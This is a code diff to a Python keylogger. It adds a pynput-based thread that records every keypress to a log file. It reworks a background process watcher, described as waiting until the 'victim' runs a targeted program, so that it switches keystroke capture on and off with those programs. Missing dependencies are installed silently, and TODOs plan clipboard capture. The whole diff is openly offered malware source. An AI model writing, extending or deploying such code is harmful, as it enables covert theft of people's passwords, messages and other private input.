@@ -1,21 +1,21 @@
 """
-TODO [ ]: stop logging when target is closed
+TODO [x]: stop logging when target is closed
 TODO [ ]: Work on logging format
     what should be the output? (ex. date - running targets - input)
     can the output be buffered?
 TODO [ ]: Implement capture copy to clipboard functionality
 """
 import sys
+import threading
 import time
 import socket
 import argparse
 import logging
 from threading import Thread, Event
 
-
 from kilogger import (
     LOGLOC,
-    coroutine,
+    DEFAULT_TIMEOUT,
     install_package,
     verify_package_installation
 )
@@ -29,6 +29,15 @@ except ImportError:
     else:
         import psutil
 
+try:
+    from pynput.keyboard import Listener
+except ImportError:
+    install_package('pynput')
+    if not verify_package_installation('pynput'):
+        sys.exit(1)
+    else:
+        from pynput.keyboard import Listener
+
 
 class StringToList(argparse.Action):
     """Convert comma-separated string to list"""
@@ -38,42 +47,90 @@ class StringToList(argparse.Action):
         setattr(namespace, self.dest, values)
 
 
+class KLogger(threading.Thread):
+    """Wrapper around pynput.keyboard.Listener"""
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.__k_listener = Listener(on_press=KLogger._on_click)
+        self.__k_listener.daemon = True
+
+    def run(self):
+        self.__k_listener.start()
+
+    def stop(self):
+        self.__k_listener.stop()
+
+    @staticmethod
+    def _on_click(key):
+        logging.info(str(key))
+
+
+class KLoggerFactory:
+    """Handles execution of KLogger threads"""
+    def __init__(self):
+        self.__current: KLogger | None = None
+
+    def start(self):
+        if not self.__current:
+            self.__current = KLogger()
+            self.__current.start()
+
+    def stop(self):
+        if self.__current:
+            self.__current.stop()
+            self.__current = None
+
+
 class ProcessListener(Thread):
     """
     Runs in background until victim executes a program in the "targets" list.
     """
-    RUNNING = 1
-    NOT_RUNNING = 0
+    RUNNING = 'Running'
+    NOT_RUNNING = 'Not Running'
     STOP = '/terminate'
 
-    def __init__(self, targets: list, callback,
+    def __init__(self, targets: list, factory: KLoggerFactory,
                  sleep: int = 10, *args, **kwargs):
         super().__init__(*args, **kwargs)
-        self.__targets = targets
-        self.__notify_callback = callback
-        self.__sleep = sleep
-        self.__running = {}
-        self.daemon = True
-        self.__stop_event = Event()
 
-    @coroutine
-    def find_process(self, targets):
-        for proc in psutil.process_iter(['name']):
-            if proc.name().lower() in targets:
-                yield {proc.name().lower(): ProcessListener.RUNNING}
+        self.__targets = {t: ProcessListener.NOT_RUNNING for t in targets}
+        self.__logger_factory = factory
+        self.__logger_status = ProcessListener.NOT_RUNNING
+        self.__sleep = sleep
+        self.__stop_event = Event()
+        self.daemon = True
+
+    def find_process(self):
+        snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
+        for t in self.__targets.keys():
+            if t in snapshot:
+                self.__targets[t] = ProcessListener.RUNNING
+            else:
+                self.__targets[t] = ProcessListener.NOT_RUNNING
 
     def run(self):
         while True:
-            for t in self.find_process(self.__targets):
-                self.notify_logger(t)
+            self.find_process()
+            active_count = 0
+            for t, s in self.__targets.items():
+                logging.info(f'{s}: {t}.')
 
+                if s == ProcessListener.RUNNING:
+                    active_count += 1
+
+                if s == ProcessListener.RUNNING and self.__logger_status == ProcessListener.NOT_RUNNING:
+                    self.__logger_status = ProcessListener.RUNNING
+                    self.__logger_factory.start()
+
+            logging.info(f'Active targets: {active_count}')
+            if active_count == 0 and self.__logger_status == ProcessListener.RUNNING:
+                self.__logger_factory.stop()
             time.sleep(self.__sleep)
 
-    def notify_logger(self, t):
-        logging.info(f'User started {t}.')
-        self.__notify_callback()
-
     def stop(self):
+        if self.__logger_status == ProcessListener.RUNNING:
+            self.__logger_factory.stop()
         self.__stop_event.set()
 
 
@@ -143,7 +200,7 @@ def friendly_check():
     return target_killed or target_found
 
 
-if __name__ == "__main__":
+def main():
     # --- Setup argparse
     PARSER = argparse.ArgumentParser()
 
@@ -178,18 +235,16 @@ if __name__ == "__main__":
 
         logging.basicConfig(filename=LOGLOC, level=logging.DEBUG)
 
-        def on_click(key):
-            logging.info(str(key))
-
-        def start_log():
-            with Listener(on_press=on_click) as keyboard_listener:
-                keyboard_listener.join()
-
-
         # --- Run logger
+        logger_factory = KLoggerFactory()
         if args.targets:
-            proc_listener = ProcessListener(args.targets, callback=start_log)
+            proc_listener = ProcessListener(args.targets, sleep=DEFAULT_TIMEOUT, factory=logger_factory)
             proc_listener.start()
             proc_handler = ListenerSocket(proc_listener)
         else:
-            start_log()
+            # TODO: handle stop maybe with "with"
+            logger_factory.start()
+
+
+if __name__ == "__main__":
+    main()
